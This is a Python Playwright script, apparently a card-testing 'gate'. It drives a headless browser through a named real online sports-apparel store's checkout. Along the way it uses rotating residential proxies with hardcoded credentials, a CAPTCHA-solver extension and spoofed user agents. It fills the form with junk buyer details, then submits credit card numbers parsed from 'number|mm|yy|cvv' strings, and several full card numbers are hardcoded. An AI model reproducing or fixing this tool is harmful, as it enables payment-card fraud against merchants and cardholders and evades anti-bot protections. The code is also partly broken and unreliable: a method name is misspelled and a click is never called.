
import httpx
import os
from playwright.sync_api import Playwright, Page
from playwright.async_api import async_playwright
from playwright_recaptcha import recaptchav2, RecaptchaSolveError
import asyncio
from randomuser import RandomUser
from fake_useragent import UserAgent
import random

cdir = os.getcwd()


class chipply_gate():
    page = None
    cc = None
    info = None
    user_agent = None
    proxy = None

def find_between( data, first, last ):
    try:
        start = data.index( first ) + len( first )
        end = data.index( last, start )
        return data[start:end]
    except ValueError:
        return None
    

async def prep_browser(playwright, url, cc):
    user_data_dir = "~/tmp/user-data-dir"
    firefo_ext = f"{cdir}/firefox-extension/buster_captcha_solver-2.0.1.xpi"
    port = random.randint(10100, 10120)
    port_rotate = random.randint(9000, 9002)
    username = "geonode_JFNTdE7PxE"
    password = "1c348b0d-606e-4a50-a71e-442329fc9212"
    GEONODE_DNS = f"premium-residential.geonode.com:{port_rotate}"
    
    async with async_playwright() as playwright:
        ua = UserAgent()
        args=[
            '--deny-permission-prompts',
            '--no-default-browser-check',
            '--no-first-run',
            '--deny-permission-prompts',
            '--disable-popup-blocking',
            '--ignore-certificate-errors',
            '--no-service-autorun',
            '--password-store=basic',
            f"--user-agent={ua['Firefox']}",
            "--headless=new",   # the new headless arg for chrome v109+. Use '--headless=chrome' as arg for browsers v94-108.
            f"--disable-extensions-except={firefo_ext}",
            f"--load-extension={firefo_ext}",
            '--window-size=640,480',
            '--disable-audio-output'
            ]
        proxy={"server": GEONODE_DNS,
                "username": username,
                "password": password}
        
        context = await playwright.firefox.launch_persistent_context(
                    headless=False, 
                    proxy=proxy,
                    args=args,
                    slow_mo=100,
                    user_data_dir = user_data_dir,
                    )
        page = await context.new_page()
        try:
            await page.goto(url, wait_until="networkidle", timeout=0)
            await page.wait_for_load_state("networkidle", timeout=60000)
            page = await process_navi(page, cc)
        except Exception as err:
            await page.close()
            await context.close()
            print(err)
                
async def process_navi(page, cc):
    user = RandomUser({'Country': 'United States'})
    name = user.get_full_name()
    fname = user.get_first_name()
    lname = user.get_last_name()
    street = user.get_street()
    phone = user.get_cell()
    email = user.get_email()
    postcode = "90001"
    
    card = cc.split("|")
    ccn = card[0]
    cc_2 = f"{ccn[:4]}+{ccn[4:8]}+{ccn[8:12]}+{ccn[12:16]}" 
    
    mm = card[1]
    yy = card[2]
    cvv = card[3]
    
    if ccn[:1] == "5":
        cardType = "mastercard"
        
    elif ccn[:1]== "4":
        cardType = "visa"
        
    elif ccn[:1] == "3":
        cardType = "amex"
    await page.locator('xpath=//*[@id="ctl00_ContentPlaceHolder1_DDSize"]').select_option(index=1)
    await page.get_by_role("button", name="Add to Cart").click()
    await page.get_by_role("button", name="Proceed to Checkout").click()
    await page.get_by_label("Email").click()
    await page.get_by_label("Email").fill("dksajlkjsalkd2@gmail.com")
    await page.get_by_label("Email").press("Tab")
    await page.get_by_label("Phone Number").click()
    await page.get_by_label("Phone Number").fill("(2154123124")
    await page.get_by_label("Phone Number").press("Tab")
    await page.get_by_label("First Name", exact=True).fill("dsadsaa")
    await page.get_by_label("Last Name", exact=True).fill("asdsad")
    await page.get_by_label("First Name", exact=True).press("Tab")
    await page.get_by_label("Last Name", exact=True).fill("asdsadsa")
    await page.get_by_label("Company Name").click()
    await page.get_by_label("Company Name").fill("sadsadsa")
    # await page.get_by_role("button", name="Country United States").click()
    # await page.get_by_role("option", name="United States").get_by_text("United States").click()
    # await page.locator("div:nth-child(5) > .col").click()
    await page.get_by_label("Address", exact=True).fill("dsadsad 12")
    await page.get_by_label("Address", exact=True).press("Tab")
    await page.get_by_label("Address 2").press("Tab")
    await page.get_by_label("City").fill("dasdasas")
    await page.get_by_label("City").press("Tab")
    # await page.get_by_role("button", name="State/province").click()
    state = await page.query_selector("#input-88")
    await page.locator(state).select_option(index=6)
    # await page.get_by_text("California").click()
    await page.get_by_label("ZIP/postal code").click()
    await page.get_by_label("ZIP/postal code").fill("90001")
    await page.get_by_role("button", name="Continue").first.click()
    await page.get_by_label("Recipient First Name").click()
    await page.get_by_label("Recipient First Name").fill("dsadasdas")
    await page.get_by_label("Recipient First Name").press("Tab")
    await page.get_by_label("Recipient Last Name").fill("asdasdasd")
    await page.get_by_role("button", name="Continue").nth(1).click()
    await page.get_by_text("Pickup at Plainfield Store").click()
    await page.get_by_role("button", name="Continue").nth(2).click()
    # await page.locator(".v-input__slot > .v-input--selection-controls__input > .v-input--selection-controls__ripple").click()
    await page.get_by_role("button", name="Continue").nth(3).click()
    await page.get_by_label("Credit Card Number").click()
    await page.get_by_label("Credit Card Number").fill("5561 1022 7515 2696")
    await page.get_by_label("Credit Card Number").press("Tab")
    await page.get_by_label("Cardholder Name").fill("dasd asdas")
    await page.get_by_label("Cardholder Name").press("Tab")
    await page.get_by_label("Exp MM/YY").fill("10/26")
    await page.get_by_label("Exp MM/YY").press("Tab")
    await page.get_by_label("Sec Code").fill("000")
    await page.wait_for_timeout(3000)
    async with page.expec_response() as check_response:
        placeorder = await page.get_by_role("button", name="Place Order")
        await page.wait_for_element(placeorder)
        placeorder.click
        r = await check_response.value
        response = await r.body() 
        return page




        
async def process_whole():
    page_url = "https://eichssports.chipply.com/twisterssoftball/product-detail.aspx?pid=1054238&cid=94399"
    cc = "4824080020114607|12|2025|000"
    try:
        response = prep_browser(playwright = Playwright, url=page_url, cc=cc)
        # response = await get_result(page)
        return response
    except Exception as er:
        print(f"error message: {er}")
            
    finally:
        print("checking process stop")
        return

                # page.set_default_navigation_timeout(50000)             
                # async with recaptchav2.AsyncSolver(page) as solver:
                #     token = await solver.solve_recaptcha(attempts=4)    
                #     return token
                
        #     except RecaptchaSolveError as reError:
        #         # await page.reload(timeout=0, wait_until="networkidle") 
        #         print(f"Captcha Error: {reError}")
        #         await page.close()
        #         await context.close()
        #     except:
        #         await page.close()
        #         await context.close()
        # await page.close()
        # await context.close()




if __name__ == "__main__":    
    asyncio.run(process_whole())    
    exit()
    # reqUrl="https://eichssports.chipply.com/twisterssoftball/product-detail.aspx?pid=1054238&cid=94399"
    # # reqUrl="https://ipinfo.io/ip"
    # check = process_check(reqUrl=reqUrl)
    # print(check)
